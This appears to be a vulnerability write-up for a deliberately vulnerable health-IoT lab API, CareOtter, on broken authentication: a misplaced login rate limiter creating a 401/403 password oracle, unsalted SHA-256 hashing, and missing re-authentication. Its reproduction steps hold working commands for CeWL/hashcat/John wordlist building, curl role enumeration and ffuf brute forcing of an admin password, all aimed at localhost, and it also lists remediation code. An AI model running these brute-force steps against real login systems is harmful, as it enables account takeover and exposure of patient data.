---
id: API2:2023
title: Broken Authentication
category: API
status: DONE
severity: High
owasp: API2:2023 — Broken Authentication
cwe: CWE-287 (Improper Authentication) / CWE-308 (Use of Single-factor Authentication) / CWE-759 (Use of a One-Way Hash without a Salt) / CWE-307 (Improper Restriction of Excessive Authentication Attempts) / CWE-204 (Observable Response Discrepancy)
source_docs:
  - CareOtter_API.md Vulnerability Surface
affected_components:
  - cloud_api/careotter/api_server/app.py
  - cloud_api/careotter/api_server/core/jwt_service.py
  - cloud_api/careotter/api_server/core/decorators.py
  - cloud_api/careotter/api_server/services/database_service.py
  - cloud_api/careotter/api_server/config.py
  - vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/LoginActivity.java
verified_date: 2026-06-05
---

# API2 — Broken Authentication

> **Source docs:** `CareOtter_API.md` Vulnerability Surface  
> **OWASP:** API2:2023 — Broken Authentication  
> **CWE:** CWE-287 (Improper Authentication) / CWE-308 (Use of Single-factor Authentication) / CWE-759 (Use of a One-Way Hash without a Salt) / CWE-307 (Improper Restriction of Excessive Authentication Attempts) / CWE-204 (Observable Response Discrepancy)  
> **Severity:** High

---

## Why It Matters

**Broken Authentication** covers any weakness that allows an attacker to compromise tokens, credentials, or session identifiers, or to impersonate other users. In CareOtter, authentication flaws span the entire stack: from password storage and JWT signing secrets to unprotected administrative endpoints and missing rate limits on login.

The impact is severe because:
- Patient vitals are **Protected Health Information (PHI)**. Any authentication bypass grants access to cardiac telemetry, clinical alerts, and device MAC addresses.
- The device registration endpoint allows **account takeover** by overwriting existing patient and admin credentials without authentication.
- Weak password hashing (unsalted SHA-256) means a leaked database can be cracked offline in seconds with rainbow tables or GPU-accelerated hashcat.


---

## Root Cause

### 1. Login brute-force protection is *misplaced* on the patient endpoint (the one online oracle)

The admin-panel endpoint `/api/auth/login` is **not** an oracle. It enforces the
per-username sliding-window limiter on **every** request (independent of
`Config.VULNERABLE`), it is **admin-only** (the old `allowed_roles = ('admin',
'patient')` is gone), and any failure — wrong password *or* a non-admin account —
returns an **identical `401`**, so it reveals no difference between a patient and
an admin username:

```python
@app.route('/api/auth/login', methods=['POST'])
def login():
    ...
    allowed, retry_after = _login_rate_check(username)   # always on, no role branch
    if not allowed:
        return jsonify({'error': 'Too many login attempts. Try again later.', 'code': 'RATE_LIMITED'}), 429
    user = db.verify_user(username, password)
    if user is None or user.get('role') != 'admin':      # uniform 401 — no 403, no role leak
        _login_record_fail(username)
        return jsonify({'error': 'Invalid username or password', 'code': 'AUTH_FAIL'}), 401
    ...   # issue admin JWT
```

`/api/auth/login/caregiver` was hardened the same way (always-on limiter,
caregiver-only, uniform `401`) so it is no longer a parallel oracle. The **one**
intentional online brute-force oracle is `/api/auth/login/patient`, which **does**
have a per-username sliding-window limiter
(`LOGIN_MAX_ATTEMPTS = 5` / `LOGIN_WINDOW = 300 s`) — but it is wired in **after**
the patient-role gate, and the role is resolved by *username* (via
`get_user_by_username`) rather than by a successful password check. So any
**non-patient** account (admin / caregiver) short-circuits to a `401`/`403`
response **before the limiter is ever reached** (`VULNERABLE=1`):

```python
user = db.verify_user(username, password)          # dict iff username+password valid

# BUG: role gate (by username) runs BEFORE the rate-limit check.
account = db.get_user_by_username(username)
if account is not None and account.get('role') != 'patient':
    if user is not None:
        return jsonify({'error': 'Access denied for this role', 'code': 'FORBIDDEN'}), 403   # creds CORRECT
    return jsonify({'error': 'Invalid username or password', 'code': 'AUTH_FAIL'}), 401       # creds WRONG
    # ← no _login_rate_check() and no _login_record_fail() on this path

# Only patients / unknown usernames reach the limiter:
allowed, retry_after = _login_rate_check(username)
if not allowed:
    return jsonify({'error': 'Too many login attempts. Try again later.', 'code': 'RATE_LIMITED'}), 429
if user is None:
    _login_record_fail(username)
    return jsonify({'error': 'Invalid username or password', 'code': 'AUTH_FAIL'}), 401
```

This single ordering mistake opens **two leak channels** against admin/caregiver accounts:

| Channel | Observation | What it leaks | CWE |
|---------|-------------|---------------|-----|
| Missing throttle | `429` **never fires**, no matter how many guesses | the username is a **non-patient** (admin/caregiver) account | CWE-307 |
| Response discrepancy | `401` (wrong) vs `403` (correct) on the same endpoint | when a guessed **admin password is correct** | CWE-204 |

So an attacker enumerates roles (any username that never gets throttled is privileged) **and** brute-forces the admin password with unlimited attempts, watching for the `401 → 403` flip. A *patient* username on the same endpoint, by contrast, is correctly throttled at 5 failures.

> **Secure mode (`VULNERABLE=0`):** the limiter runs **first** and every
> non-patient-success collapses into a uniform, rate-limited `401` — the `403`
> oracle disappears and admin probing is throttled exactly like patient probing.

**Still weak across the login surface:**
- No per-IP rate limiting (the limiter keys on username only — evadable by rotating usernames)
- No account lockout / CAPTCHA / exponential backoff
- On `/api/auth/login/patient`, the limiter is **bypassed** for non-patient accounts (the bug above) — the lab's one online admin-password oracle

### 2. Weak password storage (unsalted SHA-256)

`database_service.py` hashes passwords with raw SHA-256 and no salt:

```python
def _hash_password(self, password: str) -> str:
    """Simple SHA-256 hash for lab purposes (not production-safe)."""
    return hashlib.sha256(password.encode('utf-8')).hexdigest()
```

**Consequences:**
- Identical passwords produce identical hashes → trivial to detect password reuse across accounts.
- Rainbow tables for 8-character alphanumeric passwords fit in modern GPU memory.
- No work factor (unlike bcrypt/Argon2) — an RTX 4090 can test billions of SHA-256 hashes per second.
### 3. Sensitive operations without password confirmation

Multiple endpoints perform security-critical actions without requiring the user's current password:

| Endpoint                                    | Action                           | Password confirmation? |
| ------------------------------------------- | -------------------------------- | ---------------------- |
| `DELETE /api/devices/me`                    | Unregister patient's device      | ❌ No                   |
| `POST /api/patient/caregivers`              | Assign a caregiver               | ❌ No                   |
| `DELETE /api/patient/caregivers/<username>` | Remove a caregiver               | ❌ No                   |
| `POST /api/network/wifi`                    | Change device WiFi credentials   | ❌ No                   |
| `POST /api/config/thresholds`               | Modify clinical alert thresholds | ❌ No                   |
| `POST /api/services/restart`                | Restart device services          | ❌ No                   |

---

## Steps to Reproduce

### 1. Credential stuffing / brute force on login

Login brute-force protection is uneven across the three endpoints, and the **one
exploitable online vector** is the admin-password oracle on the patient endpoint:

| Endpoint | Rate limit | Role accepted | Failure response | Brute-forceable? |
|----------|-----------|---------------|------------------|------------------|
| `/api/auth/login` (admin panel) | **always on** | `admin` only | uniform `401` (no `403`) | **No** — throttled at 5, no oracle |
| `/api/auth/login/patient` | on, but **bypassed for non-patients** | `patient` (+ admin/caregiver leak) | `401`/**`403`** for admin/caregiver, throttled for patient | **Yes — admin/caregiver** (the bug, §2) |
| `/api/auth/login/caregiver` | **always on** | `caregiver` only | uniform `401` (no `403`) | **No** — throttled, no oracle (hardened) |

So the **one** online brute-force vector is: **brute-force an `admin` password
through `/api/auth/login/patient`**, reading the `401 → 403` flip, with no
throttle (§2). The admin panel (`/api/auth/login`) and the caregiver endpoint both
rate-limit and return a uniform `401`, so neither leaks role or credentials.

#### Prerequisites — prepare a *targeted* dictionary (CeWL + rule mangling)

A generic leak list such as `rockyou.txt` does **not** contain `CareOtter2026!`,
and no human "guesses" it: it is the product name re-cased, plus the year, plus a
symbol. Online guessing only works with a dictionary built from **information
about this specific system**, then expanded with mangling rules. Workflow:
(1) harvest the target's vocabulary, (2) combine + mutate it into realistic
candidates, (3) feed the result to the `ffuf` oracle in §2.

**1) Harvest the lexicon from the system.** `CeWL` (Custom Word List generator)
spiders the CareOtter web portal and prints every word it contains — and the UI is
full of the exact tokens we need (`CareOtter`, `careservice`, `Care`, `otter`, …),
**with their original case**. That casing is the whole point: the page hands you
the capitalised `CareOtter` for free, which you would never reproduce by typing
`careotter` lowercase.

```bash
# Crawl the portal + admin login page → raw lexicon (keep case and numbers)
cewl -d 2 -m 3 --with-numbers http://localhost:5002/             -w cewl-site.txt
cewl -d 1 -m 3                  http://localhost:5002/admin/login -w cewl-login.txt
sort -u cewl-site.txt cewl-login.txt > lexicon.txt
```

Fold in any other *practical system information* from recon — service/container
names (`careservice`, `careotter`), the brand split into parts, and numeric pivots
(this/next year, trivial runs). If CeWL is unavailable, seed the same base by hand:

```bash
cat > base.txt << 'EOF'
care
giver
careservice
careotter
otter
admin
123
2026
EOF
cat base.txt >> lexicon.txt && sort -u lexicon.txt -o lexicon.txt
```

**2) Combine and mutate into candidates.** The tokens are *building blocks*, not
the password — a rule engine concatenates and mutates them (re-case, append a
year, add a trailing symbol). Any of these will reconstruct `CareOtter2026!`:

- **hashcat — rule file** (`--stdout`, used here purely as a candidate generator,
  no hash). One rule that appends the literal `2026!` turns the harvested
  `CareOtter` into the password:

  ```bash
  printf '$2 $0 $2 $6 $!\n' > append-2026.rule     # append 2,0,2,6,!  →  "2026!"
  hashcat --stdout -a 0 -r append-2026.rule lexicon.txt > candidates.txt
  #  CareOtter  ->  CareOtter2026!
  ```

- **hashcat — combinator** (`-a 1`) to glue two lists, left = words, right =
  year/suffix tokens (great when the password is `word + word`):

  ```bash
  printf '%s\n' Care Otter CareOtter care otter   > left.txt
  printf '%s\n' 2026 2026! 2025! 123 '!'          > right.txt
  hashcat --stdout -a 1 left.txt right.txt >> candidates.txt
  #  CareOtter + 2026!  ->  CareOtter2026!
  ```

- **John the Ripper** as a generator — add a custom append rule, then emit
  candidates (also good with a built-in ruleset like `--rules=best64`):

  ```bash
  cat >> ~/.john/john.conf << 'EOF'
  [List.Rules:CareOtter]
  Az"2026!"
  EOF
  john --wordlist=lexicon.txt --rules=CareOtter --stdout 2>/dev/null >> candidates.txt
  ```

- **CUPP** (`cupp -i`) and **Mentalist** build the same kind of list from a
  profile/keyword chain (organisation = *CareOtter*, year = *2026*, append symbols)
  when you want the combinations generated for you.

Deduplicate — you now have a small, high-signal list that *contains* the admin
password, instead of millions of irrelevant leaks:

```bash
sort -u candidates.txt -o careotter-passwords.txt
wc -l careotter-passwords.txt                      # hundreds, not millions
grep -nx 'CareOtter2026!' careotter-passwords.txt  # the password is in there
```

`careotter-passwords.txt` is the wordlist fed to the `ffuf` oracle in §2. The line
that flips `401 → 403` is the admin password. Only the `admin` username is needed
for that oracle:

```bash
printf 'admin\n' > users.txt
```

---

### 2. Misplaced rate limit on `/api/auth/login/patient` → unlimited admin brute force + role oracle

`/api/auth/login/patient` evaluates the **patient-role gate before the
rate-limit check** (`VULNERABLE=1`, see Root Cause #1). Because the role is read
from the username, every **non-patient** account (admin / caregiver) bypasses the
limiter and exposes two oracles at once.

#### Channel 1 — role enumeration (the throttle that never fires)

Throw more than 5 wrong passwords at a username on the **patient** endpoint and
watch the status code. A patient gets `429` on the 6th attempt. A non-patient
keeps returning `401` forever — which *is* the tell that the account is privileged:

```bash
# Patient username → throttled at the 6th attempt
for i in $(seq 1 6); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST \
    http://localhost:5002/api/auth/login/patient \
    -H "Content-Type: application/json" \
    -d '{"username":"john_doe","password":"wrong'"$i"'"}'
done
# → 401 401 401 401 401 429   (patient: limiter applies)

# Admin username → never throttled
for i in $(seq 1 6); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST \
    http://localhost:5002/api/auth/login/patient \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong'"$i"'"}'
done
# → 401 401 401 401 401 401   (admin: limiter bypassed → this username is privileged)
```

#### Channel 2 — password oracle (`401` → `403`) with unlimited attempts

On the same endpoint, a **wrong** admin password returns `401` and a **correct**
one returns `403 FORBIDDEN` (the account is real but "not a patient"). Since the
limiter is never reached, the whole keyspace can be tried. With `ffuf`, match the
`403` to flag the hit:

```bash
ffuf -u http://localhost:5002/api/auth/login/patient \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w careotter-passwords.txt \
  -fc 401 \
  -mc all
# careotter-passwords.txt = the targeted list from "prepare a targeted dictionary"
# the surviving (403) line is the correct admin password — no 429 ever appears
```

![[api2_admin_brute_force.png]]

Manual confirmation of the oracle flip:

```bash
# wrong password → 401
curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"hunter2"}'        # → 401

# correct password → 403 (Access denied for this role) — credentials confirmed valid
curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"CareOtter2026!"}' # → 403
```

The recovered admin password then logs in for real at `/api/auth/login`, which
returns an admin-role JWT.

> **Secure mode (`VULNERABLE=0`):** the rate-limit check runs first and any
> non-patient result is a uniform, throttled `401`. The `admin + CareOtter2026!`
> request returns `401` (no `403` oracle) and admin probing is rate-limited
> exactly like patient probing.

---
### 3. Perform sensitive operation without password confirmation

```bash
# Obtain a patient JWT
JWT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username":"john_doe","password":"johnny123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Unregister the device without ever providing the password again
curl -s -X DELETE -H "Authorization: Bearer $JWT" \
  http://localhost:5002/api/devices/me
```

> **Expected:** `200 OK` — device is unregistered with no password confirmation step.

---

## Expected Result

- `/api/auth/login` (admin panel) is admin-only and **always** rate-limited (regardless of `Config.VULNERABLE`): wrong credentials *and* non-admin accounts both return an identical `401 AUTH_FAIL`, and the username is locked after 5 failures (`429`). No `403`, no role/oracle leak — it cannot be used to brute-force any account.
- `/api/auth/login/caregiver` is hardened like `/api/auth/login`: always rate-limited, caregiver-only, uniform `401` (no `403`, no oracle).
- `/api/auth/login/patient` (`VULNERABLE=1`) throttles *patient* and unknown usernames at 5 failures / 5 min (`429`), but **non-patient** accounts (admin/caregiver) are **never throttled** and leak a `401`-vs-`403` password oracle — the lab's one online admin brute-force vector. Under `VULNERABLE=0` all paths throttle uniformly and the oracle is gone.
- A JWT forged with `careotter_jwt_2026` is accepted as valid by all protected endpoints.
- `POST /admin/device/register` succeeds without any `Authorization` header and overwrites existing user passwords.
- `GET /initialize_iot` returns default passwords in plaintext JSON.
- `DELETE /api/devices/me`, `POST /api/network/wifi`, and other sensitive endpoints succeed with only the JWT cookie/header — no password re-authentication.

---

## How It Should Be

### Rate-limit login attempts — and order the checks correctly

The limiter primitive itself is fine, the vulnerability is **where it sits in the
handler**. Run the rate-limit check **before** any role gate, and never branch the
response on the account's role — return a single, uniform `401` for every failure
(wrong password *and* "valid but not a patient"), counting all of them:

```python
import time

_login_attempts = {}
LOGIN_MAX_ATTEMPTS = 5
LOGIN_WINDOW = 300  # 5 minutes

def _login_rate_check(key: str) -> tuple[bool, float]:
    now = time.time()
    attempts = [t for t in _login_attempts.get(key, []) if now - t < LOGIN_WINDOW]
    if len(attempts) >= LOGIN_MAX_ATTEMPTS:
        return False, LOGIN_WINDOW - (now - attempts[0])
    return True, 0.0

def _login_record_fail(key: str):
    _login_attempts.setdefault(key, []).append(time.time())


@app.route('/api/auth/login/patient', methods=['POST'])
def login_patient():
    ...
    # 1) Throttle FIRST — before any role decision, keyed on username AND client IP
    key = f"{request.remote_addr}:{username}"
    allowed, retry_after = _login_rate_check(key)
    if not allowed:
        return jsonify({'error': 'Too many login attempts', 'code': 'RATE_LIMITED'}), 429

    # 2) Verify credentials and the role TOGETHER, then return ONE uniform error
    user = db.verify_user(username, password)
    if user is None or user.get('role') != 'patient':
        _login_record_fail(key)
        # identical body/status whether the password was wrong or the account
        # simply isn't a patient → no 401-vs-403 oracle, no role enumeration
        return jsonify({'error': 'Invalid username or password', 'code': 'AUTH_FAIL'}), 401
    ...
```

This is exactly the `VULNERABLE=0` branch shipped in `login_patient()`. Keying the
limiter on `remote_addr` + username (rather than username alone) also stops the
attacker side-stepping the throttle by rotating usernames.

### Use bcrypt/Argon2 with salt

```python
import bcrypt

def _hash_password(self, password: str) -> str:
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()

def verify_user(self, username: str, password: str) -> Optional[dict]:
    user = self.get_user_by_username(username)
    if not user:
        return None
    if bcrypt.checkpw(password.encode(), user['password_hash'].encode()):
        return { ... }
    return None
```

### Require password confirmation for sensitive operations

```python
# Example pattern for DELETE /api/devices/me
current_password = data.get('current_password', '')
if not db.verify_user(username, current_password):
    return jsonify({'error': 'Current password required'}), 403
```

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Authentication | Per-IP + per-account rate limiting on login (5 attempts / 5 min) | Stop credential stuffing and brute force |
| Authentication | Run the rate-limit check **before** any role/authorization gate, never `return` early on a path that skips the counter | Close the misplaced-limiter bypass (CWE-307) |
| Authentication | Uniform `401` for every failed login (wrong password *and* wrong role) — no role-dependent status/body | Kill the `401`/`403` response-discrepancy oracle (CWE-204) |
| Authentication | Account lockout after N consecutive failures | Slow down targeted attacks |
| Authentication | CAPTCHA after 3 failed attempts | Distinguish humans from automated tools |
| Storage | Replace SHA-256 with bcrypt/Argon2 + salt | Prevent offline cracking of leaked hashes |
| Storage | Enforce password complexity policy (min 12 chars, mixed case, digits, symbols) | Reduce dictionary attack success rate |
| Token | Load JWT secret exclusively from environment / secret manager | Prevent token forgery from source-code analysis |
| Token | Rotate JWT secrets periodically | Limit window of exposure if a secret leaks |
| Authorization | Protect `/admin/device/register` with `@token_required` + admin role check | Prevent rogue device registration |
| Authorization | Verify current password before overwrite in `create_or_update_user` | Prevent account takeover via device registration |
| Session | Require password re-authentication for sensitive operations (device unregister, WiFi change, password change) | Mitigate session hijacking impact |
| Bootstrap | Remove `/initialize_iot` or protect it with a one-time bootstrap token | Prevent exposure of default credentials |

---

## Known gaps / out of scope

- **`/api/auth/login/caregiver` was a parallel oracle and is now closed.** Because
  `verify_user` returns a dict for any valid credentials, the old `role !=
  'caregiver'` check returned `403` for *every non-caregiver* account with the
  correct password — an unlimited `401`/`403` oracle that reached `admin` **and**
  patients (`john_doe` + correct → `403`). It now uses the same pattern as
  `/api/auth/login` (rate-limit first, caregiver-only, uniform `401`), so it leaks
  nothing and the "admin-only, via the patient panel" invariant holds again.
- **Direct patient-account brute force is not viable online.** With the caregiver
  endpoint closed, `john_doe` can no longer be brute-forced on any login endpoint
  (patient endpoint throttles patients. admin/caregiver endpoints reject them with
  a uniform, throttled `401`). Gaining access to a patient account is intended to
  be a separate, dedicated vulnerability — documented when implemented.
- **Reset-on-success.** All three login endpoints clear a username's failure
  window on a successful login (`_login_reset`). This is standard practice and
  also keeps the mobile app's *admin-first → patient-fallback* flow from locking a
  patient out (the throwaway admin-endpoint `401` is wiped by the patient login
  that immediately succeeds). It does not weaken the patient-endpoint oracle, which
  never reaches a token-success on the admin path (a correct admin password returns
  `403`, not a token).
- **Mobile app (`careotter_app`).** `/api/auth/login` is admin-only, so
  `LoginActivity` now tries it first and falls back to `/api/auth/login/patient` on
  a `401` (it cannot know the role before authenticating). Admin logins resolve on
  the first endpoint, patient logins on the fallback.
- **Forged admin JWT → arbitrary user deletion.** With the weak secret, an attacker
  mints a `role:admin` JWT and calls `POST /api/users/delete {"username":"…"}` (the
  admin branch of the User Administration feature) to delete any account — no SSRF
  needed. Cross-ref `API7_Server_Side_Request_Forgery.md` (the same endpoint's
  loopback branch is the no-credential SSRF path).

---
## References

- `CareOtter_API.md` Vulnerability Surface
- `cloud_api/careotter/api_server/app.py` (`login`, `login_patient`, `login_caregiver`, `_login_rate_check`/`_login_record_fail`/`_login_reset`, `device_register`, `initialize_iot`, `delete_my_device`)
- `vulnzoo_apps/careotter_app/.../LoginActivity.java` (`doLogin` admin-first → patient fallback for the admin-only `/api/auth/login`)
- `cloud_api/careotter/api_server/core/jwt_service.py`
- `cloud_api/careotter/api_server/core/decorators.py`
- `cloud_api/careotter/api_server/services/database_service.py` (`_hash_password`, `verify_user`, `register_device_with_signature`)
- `cloud_api/careotter/api_server/config.py`
